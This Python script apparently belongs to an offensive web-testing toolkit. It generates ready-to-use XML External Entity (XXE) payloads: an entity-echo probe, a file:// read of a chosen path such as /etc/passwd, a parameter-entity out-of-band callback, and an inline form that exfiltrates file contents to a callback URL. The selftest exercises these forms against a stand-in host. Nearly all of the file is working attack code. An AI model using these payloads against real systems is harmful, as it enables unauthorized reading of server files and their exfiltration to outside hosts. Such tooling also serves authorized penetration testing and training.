#!/usr/bin/env python3
"""xxe_gen.py — the three XXE payload forms the skill prescribes, one file.

web-xxe orders the probes: a harmless internal-entity marker that answers
"does the parser expand entities and echo them", then a file-reference
entity once the echo channel exists, then a parameter-entity OOB form for
the blind case that pairs with tools/web/oob_listener.py. Hand-editing
these DTDs under time pressure is how malformed-XML noise gets mistaken
for a signal. This emits each form verbatim, optionally re-rooted to the
element the endpoint expects.

    python3 tools/web/xxe_gen.py --probe [--root r]
    python3 tools/web/xxe_gen.py --file /etc/passwd [--root r]
    python3 tools/web/xxe_gen.py --oob http://CALLBACK/x [--root r]
    python3 tools/web/xxe_gen.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys


def forms(root: str, file_path: str, oob: str, probe: str) -> dict:
    head = '<?xml version="1.0"?>\n'
    return {
        "probe": (f"{head}<!DOCTYPE {root} [<!ENTITY probe \"{probe}\">]>\n"
                  f"<{root}>&probe;</{root}>"),
        "file": (f"{head}<!DOCTYPE {root} [<!ENTITY xxe SYSTEM \"file://{file_path}\">]>\n"
                 f"<{root}>&xxe;</{root}>"),
        "oob": (f"{head}<!DOCTYPE {root} [\n"
                f"  <!ENTITY % pe SYSTEM \"{oob}\">\n"
                f"  %pe;\n"
                f"]>\n<{root}></{root}>"),
        "oob-inline": (f"{head}<!DOCTYPE {root} [\n"
                       f"  <!ENTITY % file SYSTEM \"file://{file_path}\">\n"
                       f"  <!ENTITY % pe \"<!ENTITY exfil SYSTEM '{oob}?d=%file;'>\">\n"
                       f"  %pe;\n  %exfil;\n"
                       f"]>\n<{root}></{root}>"),
    }


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--probe", nargs="?", const="XXE_PROBE",
                    help="emit the harmless entity-echo marker doc")
    ap.add_argument("--file", metavar="PATH",
                    help="emit a file:// entity read of PATH")
    ap.add_argument("--oob", metavar="URL",
                    help="emit the parameter-entity callback form for URL")
    ap.add_argument("--root", default="r", help="root element name")
    ap.add_argument("--json", action="store_true", help="all forms as JSON")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        f = forms("r", "/etc/passwd", "http://cb/x", "XXE_PROBE")
        assert '<!ENTITY probe "XXE_PROBE">' in f["probe"]
        assert 'file:///etc/passwd' in f["file"]
        assert 'SYSTEM "http://cb/x"' in f["oob"] and "%pe;" in f["oob"]
        assert "%file;" in f["oob-inline"] and "?d=%file;" in f["oob-inline"]
        print("xxe_gen selftest: ok")
        return 0
    f = forms(args.root, args.file or "/etc/passwd", args.oob or "",
              args.probe if isinstance(args.probe, str) else "XXE_PROBE")
    if args.json:
        print(json.dumps(f, indent=1))
        return 0
    if args.probe is not None and args.file is None and args.oob is None:
        print(f["probe"])
    elif args.file and args.oob is None:
        print(f["file"])
    elif args.oob and args.file is None:
        print(f["oob"])
    elif args.oob and args.file:
        print(f["oob-inline"])
    else:
        ap.print_help()
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
